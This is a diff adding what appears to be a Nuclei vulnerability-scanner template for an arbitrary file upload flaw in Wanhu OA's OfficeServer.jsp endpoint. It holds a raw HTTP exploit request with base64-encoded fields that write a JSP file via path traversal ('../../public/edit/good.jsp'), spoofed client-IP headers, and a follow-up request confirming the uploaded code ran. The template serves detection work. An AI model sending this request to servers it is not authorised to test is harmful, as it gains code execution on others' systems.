@@ -1,0 +1,41 @@
+id: wanhuOA-OfficeServer_jsp-file-upload
+
+info:
+  name: 万户OA OfficeServer.jsp 任意文件上传漏洞
+  author: cnaq 
+  severity: critical
+  description: 万户OA 除了 /defaultroot/officeserverservlet 接口外的另一处接口 OfficeServer.jsp 同时也存在任意文件上传漏洞，导致攻击者可上传任意文件获取服务器权限
+  reference: 
+    - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20OfficeServer.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  tags: wanhu,OA,file,upload
+
+requests:
+  - raw:
+      - |
+        POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+        x-forwarded-for: 127.0.0.1
+        x-originating-ip: 127.0.0.1
+        x-remote-ip: 127.0.0.1
+        x-remote-addr: 127.0.0.1
+            
+        DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU=
+        RECORDID=
+        isDoc=dHJ1ZQ==
+        moduleType=Z292ZG9jdW1lbnQ=
+        FILETYPE=Li4vLi4vcHVibGljL2VkaXQvZ29vZC5qc3A=
+        <%@page import="java.text.*,java.util.*,java.io.*"%><%out.println("{{randstr}}");%>
+
+      - |
+        GET /defaultroot/public/edit/good.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200&&contains(body_1, "DBSTEP")'
+          - 'status_code_2 == 200&&contains(body_2, "{{randstr}}")'
+        condition: and
